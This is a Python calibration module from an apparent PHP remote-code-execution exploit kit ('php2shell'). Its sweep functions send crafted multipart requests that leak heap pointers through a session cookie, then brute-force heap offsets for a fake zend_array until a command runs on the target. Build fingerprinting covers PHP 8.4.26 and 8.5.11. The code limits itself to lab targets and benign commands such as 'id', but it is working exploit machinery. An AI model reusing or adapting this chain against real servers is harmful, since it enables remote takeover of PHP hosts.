"""Per-build heap-geometry calibration (G1) — the portability blocker.

Offsets are cheap (`php2shell/offsets.py`). The chain's *geometry* is not:
`MAIN_BUCKET_COUNT` (the number of `zval_ptr_dtor` pointers in the main chunk),
`S_OFF` (where the fake `zend_array` must land relative to that chunk), and the
stage paddings are layout-dependent. 8.4.26 is calibrated; a second build needs
this harness.

Two modes:

  derive()   offline: given a captured leak (`remote.parse_leak`) plus the
             ground-truth chunk base and fake-array address (e.g. from a
             lab-assisted `/proc`/debugger run), emit the geometry row.

  sweep()    live lab: take one leak, then try the candidate chunk buckets x
             an `S_OFF` window, firing A2+B2 each time and reading the proof
             file. Lab-only, benign allowlist. This is calibration, not a
             remote brute-force: it runs against this repo's own container.

A calibrated row is merged into `profiles/<profile_id>.json`; it is still
`validated: false` until the matrix triad (pos/neg/bias) passes.
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from collections import Counter
from pathlib import Path

from . import amplify, pinning, probe, profiles, remote

ROOT = Path(__file__).resolve().parent.parent
DEFAULT_S_OFF_START = 0xF0000
DEFAULT_S_OFF_STEP = 0x1000
DEFAULT_S_OFF_COUNT = 0x21        # 0xF0000 .. 0x100000
CHUNK_ALIGN = 0x1FFFFF


def candidate_chunks(leak_info, limit=3):
    """Top 2 MiB-aligned buckets in the libphp<->chunk delta window."""
    lib = leak_info["lib"]
    prof = leak_info["profile"]
    ranked = sorted(leak_info["buckets"].items(), key=lambda kv: -kv[1])
    out = []
    for chunk, count in ranked:
        if chunk & CHUNK_ALIGN:
            continue
        delta = lib - chunk
        if not (prof["delta_min"] <= delta <= prof["delta_max"]):
            continue
        out.append((chunk, count))
        if len(out) >= limit:
            break
    return out


def derive(leak_info, actual_chunk, actual_s):
    """Offline: recover geometry from a leak + ground-truth addresses.

    `actual_chunk` is the main ZendMM chunk base whose block became the fake
    array; `actual_s` is the address the fake `zend_array` must occupy.
    """
    s_off = actual_s - actual_chunk
    count = leak_info["buckets"].get(actual_chunk)
    return {
        "s_off": s_off,
        "main_bucket_count": count,
        "s_off_hex": hex(s_off),
        "chunk": actual_chunk,
        "s": actual_s,
        "rank": _rank(leak_info, actual_chunk),
        "decoded": leak_info["decoded"],
    }


def _rank(leak_info, chunk):
    ranked = [b for b, _ in sorted(leak_info["buckets"].items(),
                                   key=lambda kv: -kv[1])]
    return ranked.index(chunk) if chunk in ranked else None


def default_s_offs(start=DEFAULT_S_OFF_START, step=DEFAULT_S_OFF_STEP,
                   count=DEFAULT_S_OFF_COUNT):
    return [start + i * step for i in range(count)]


# --------------------------------------------------------------------------
# Build fingerprint (G5) — which per-build profile does this leak belong to?
# --------------------------------------------------------------------------
def fingerprint(leak_info, table=None):
    """Rank profiles by how well the leaked bytes fit them.

    Two in-band signals: (1) `zdtor - profile.leak_dtor` must be page-aligned
    (the true libphp base is), weighted toward 2 MiB-aligned bases; (2) the
    main bucket's pointer count should equal the profile's geometry.
    """
    table = table if table is not None else profiles.load()
    arch = (leak_info.get("profile") or {}).get("arch")
    scores = []
    for pid, prof in table.items():
        if arch and prof.get("arch") != arch:
            continue
        offsets = profiles.runtime(prof).get("dtor_offsets") or [prof["leak_dtor"]]
        align = 0
        for q, c in (leak_info.get("counts") or {}).items():
            best = 0
            for off in offsets:
                base = q - off
                if base & 0xFFF == 0:
                    best = max(best, c * (4 if base & 0x1FFFFF == 0 else 1))
            align += best
        geom = sum(1 for count in (leak_info.get("buckets") or {}).values()
                   if count == prof.get("main_bucket_count"))
        scores.append({"profile_id": pid, "score": align * 10 + geom,
                       "align": align, "geom": geom})
    scores.sort(key=lambda s: (-s["score"], s["profile_id"]))
    return scores


# --------------------------------------------------------------------------
# Leak-shape sweep (G1, stage 1) — find a disclosing A1/B1 shape per build
# --------------------------------------------------------------------------
def leak_shapes():
    """Bounded A1/B1 shape variants for a build whose leak does not disclose."""
    specs = {
        "base": remote.LEAK_SPEC,
        "g10": ",".join(["G:511:0x137"] * 10 + ["X:900"]),
        "g18": ",".join(["G:511:0x137"] * 18 + ["X:900"]),
        "p117": ",".join(["G:511:0x117"] * 14 + ["X:900"]),
        "p157": ",".join(["G:511:0x157"] * 14 + ["X:900"]),
    }
    out = []
    for parts in (700, 800, 860, 920):
        for depth in (56, 64):
            for name, spec in specs.items():
                out.append({"parts": parts, "depth": depth,
                            "spec_name": name, "spec": spec})
    return out


def sweep_leak(host, port, arch="aarch64", workers=1, shapes=None,
               max_trials=None, report=print):
    """Try A1/B1 shapes until one discloses; return the shape + leak info."""
    import urllib.parse
    base = profiles.runtime(profiles.for_arch(arch))
    shapes = shapes or leak_shapes()
    if max_trials:
        shapes = shapes[:max_trials]
    for i, shape in enumerate(shapes, 1):
        report(f"[shape {i}/{len(shapes)}] parts={shape['parts']} "
               f"depth={shape['depth']} spec={shape['spec_name']}")
        try:
            with pinning.WorkerPinner(host, port, holders=max(0, workers - 1),
                                      settle=0.6):
                try:
                    probe.http_get(host, port, "/index.php", timeout=5,
                                   recv_timeout=5)
                except OSError:
                    pass
                amplify.send_chunked(host, port, "/index.php" + remote.Q,
                                     remote.a1_body(parts=shape["parts"],
                                                    depth=shape["depth"]),
                                     "multipart/form-data",
                                     boundary="C" * 10, timeout=180)
                time.sleep(0.15)
                resp = amplify.send_chunked(host, port, "/index.php",
                                            remote.b1_body(spec=shape["spec"]),
                                            "multipart/form-data",
                                            boundary="C" * 10, timeout=600)
        except OSError as exc:
            report(f"  transport error: {exc}")
            continue
        idx = resp.find(b"Set-Cookie: PHPSESSID=")
        if idx < 0:
            report(f"  no cookie ({len(resp)} B)")
            continue
        val = resp[idx + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
        dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
        if len(dec) <= 64:
            report(f"  normal session id ({len(dec)} B)")
            continue
        try:
            info = remote.parse_leak(resp, base)
        except RuntimeError as exc:
            report(f"  disclosed {len(dec)} B but no pointers: {exc}")
            continue
        return {"disclosed": True, "shape": shape, "leak": info,
                "decoded": len(dec)}
    return {"disclosed": False}



def _read_proof(proof_host):
    try:
        with open(proof_host, "rb") as fh:
            return fh.read()
    except OSError:
        return None


def _clear(path):
    try:
        if path and Path(path).exists():
            Path(path).unlink()
    except OSError:
        pass


def sweep(host, port, arch="aarch64", workers=1, cmd="id", proof_host=None,
          max_candidates=3, s_offs=None, retries=3, report=print):
    """Live lab calibration. Returns a result dict.

    This deliberately reuses the chain's own A1/B1 leak and A2/B2 fire, with
    the fixed benign command allowlist enforced by the caller.
    """
    s_offs = list(s_offs or default_s_offs())
    base_profile = profiles.runtime(profiles.for_arch(arch))

    for attempt in range(1, retries + 1):
        report(f"[leak {attempt}] A1 -> B1")
        with pinning.WorkerPinner(host, port, holders=max(0, workers - 1),
                                  settle=0.8):
            try:
                probe.http_get(host, port, "/index.php", timeout=5,
                               recv_timeout=5)
            except OSError:
                pass
            amplify.send_chunked(host, port, "/index.php" + remote.Q,
                                 remote.a1_body(), "multipart/form-data",
                                 boundary="C" * 10, timeout=180)
            time.sleep(0.2)
            resp = amplify.send_chunked(host, port, "/index.php",
                                        remote.b1_body(),
                                        "multipart/form-data",
                                        boundary="C" * 10, timeout=600)
        try:
            info = remote.parse_leak(resp, base_profile)
        except RuntimeError as exc:
            report(f"  leak failed: {exc}")
            continue

        report(f"  decoded={info['decoded']} lib={info['lib']:#x} "
               f"zdtor={info['zdtor']:#x}")
        cands = candidate_chunks(info, max_candidates)
        if not cands:
            report("  no candidate chunk in the delta window")
            continue
        report("  candidates: " + ", ".join(f"{c:#x}(n={n})" for c, n in cands))

        for chunk, count in cands:
            for s_off in s_offs:
                _clear(proof_host)
                S = chunk + s_off
                report(f"  try chunk={chunk:#x} count={count} "
                       f"s_off={s_off:#x} S={S:#x}")
                with pinning.WorkerPinner(host, port,
                                          holders=max(0, workers - 1),
                                          settle=0.8):
                    probe.http_post(
                        host, port, "/index.php", remote.a2_body(),
                        headers={"Content-Type":
                                 "multipart/form-data; boundary=CCCCCCCCCC"},
                        timeout=120, recv_timeout=120)
                    time.sleep(0.2)
                    zif = info["lib"] + base_profile["zif_offset"]
                    ht = remote.ht_body(S, zif, cmd.encode())
                    probe.http_post(
                        host, port, "/index.php", remote.b2_body(S, cmd, ht),
                        headers={"Content-Type":
                                 "multipart/form-data; boundary=CCCCCCCCCC"},
                        timeout=120, recv_timeout=120)
                time.sleep(0.6)
                out = _read_proof(proof_host)
                if out is not None and out.strip():
                    return {
                        "calibrated": True,
                        "profile_id": base_profile.get("id"),
                        "s_off": s_off,
                        "main_bucket_count": count,
                        "chunk": chunk,
                        "lib": info["lib"],
                        "decoded": info["decoded"],
                        "output": out.decode("latin-1", "strip"),
                    }
    return {"calibrated": False}


def profile_row(base, geometry, validated=False):
    """Build a profiles/<id>.json row from a base profile + geometry."""
    row = dict(base)
    row.setdefault("s_off", geometry["s_off"])
    row["s_off"] = geometry["s_off"]
    row["main_bucket_count"] = geometry["main_bucket_count"]
    row["validated"] = validated
    return row


def write_profile(row, path=None):
    path = Path(path or (profiles.PROFILE_DIR / "geometry.json"))
    data = {"profiles": {}}
    if path.is_file():
        try:
            data["profiles"] = json.loads(path.read_text()).get("profiles", {})
        except ValueError:
            pass
    data["profiles"][row["id"]] = row
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")
    return path


def self_test():
    """Synthetic leak with the 8.4.26 geometry; derive must recover it."""
    lib = 0xFFFFBA3F0000
    main = 0xFFFFB8200000
    s = main + 0xF8398
    buckets = Counter({main: 87, lib: 3, lib + 0x200000: 2})
    info = {
        "decoded": 819208,
        "lib": lib,
        "zdtor": lib + 0x63812B,
        "counts": Counter({lib + 0x63812B: 5, main: 87}),
        "buckets": buckets,
        "profile": profiles.runtime(profiles.for_arch("aarch64")),
    }
    got = derive(info, main, s)
    assert got["s_off"] == 0xF8398, hex(got["s_off"])
    assert got["main_bucket_count"] == 87, got["main_bucket_count"]
    assert candidate_chunks(info, 1)[0][0] == main
    # A wrong ground truth must not silently "succeed".
    assert derive(info, main, s + 0x1000)["s_off"] == 0xF8398 + 0x1000
    # Fingerprint must pick the build whose leak offset makes the base aligned.
    ranked = fingerprint(info)
    top = ranked[0]["profile_id"]
    assert "8.4.26" in top and "aarch64" in top, top
    # And a synthetic 8.5.11 leak must pick 8.5.11, not 8.4.26.
    info2 = dict(info)
    info2["zdtor"] = lib + 0x761B8B
    info2["lib"] = lib
    info2["counts"] = Counter({lib + 0x761B8B: 5, main: 87})
    top2 = fingerprint(info2)[0]["profile_id"]
    assert "8.5.11" in top2 and "aarch64" in top2, top2
    return True


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--target", default=None, help="host:port of the lab")
    ap.add_argument("--arch", default="aarch64",
                    choices=["x86_64", "aarch64"])
    ap.add_argument("--workers", type=int, default=1)
    ap.add_argument("--cmd", default="id", choices=("id", "uname", "whoami"))
    ap.add_argument("--proof", default=str(ROOT / "lab-pure-modphp" / "out" / "p1"))
    ap.add_argument("--max-candidates", type=int, default=3)
    ap.add_argument("--s-off", action="append", type=lambda x: int(x, 0),
                    default=None, help="explicit S_OFF (repeatable)")
    ap.add_argument("--stage", default="geometry",
                    choices=["geometry", "leak", "auto"])
    ap.add_argument("--max-trials", type=int, default=None,
                    help="bound the leak-shape sweep")
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--write", action="store_true")
    ap.add_argument("--self-test", action="store_true")
    args = ap.parse_args(argv)

    if args.self_test:
        self_test()
        print("[ok] calibration self-test (derive + fingerprint, 8.4.26/8.5.11)")
        return 0
    if not args.target:
        ap.error("give --target or --self-test")

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")

    if args.stage in ("leak", "auto"):
        res = sweep_leak(host, port, arch=args.arch, workers=args.workers,
                         max_trials=args.max_trials,
                         report=lambda m: print(f"    {m}"))
        print()
        if not res.get("disclosed"):
            print("[!] no disclosing leak shape found in the sweep window")
            return 1
        print(f"[EVIDENCE] leak shape found: parts={res['shape']['parts']} "
              f"depth={res['shape']['depth']} spec={res['shape']['spec_name']} "
              f"decoded={res['decoded']}")
        if args.stage == "leak":
            return 0

    res = sweep(host, port, arch=args.arch, workers=args.workers,
                cmd=args.cmd, proof_host=args.proof,
                max_candidates=args.max_candidates, s_offs=args.s_off,
                retries=args.retries, report=lambda m: print(f"    {m}"))
    print()
    if res.get("calibrated"):
        print(f"[EVIDENCE] geometry calibrated: s_off={res['s_off']:#x} "
              f"main_bucket_count={res['main_bucket_count']} "
              f"chunk={res['chunk']:#x}")
        if args.write:
            base = profiles.runtime(profiles.for_arch(args.arch))
            base["id"] = res.get("profile_id") or f"calibrated-{args.arch}"
            path = write_profile(profile_row(base, res))
            print(f"[ok] wrote {path}")
        return 0
    print("[!] geometry not recovered in the sweep window")
    return 1


if __name__ == "__main__":
    sys.exit(main())
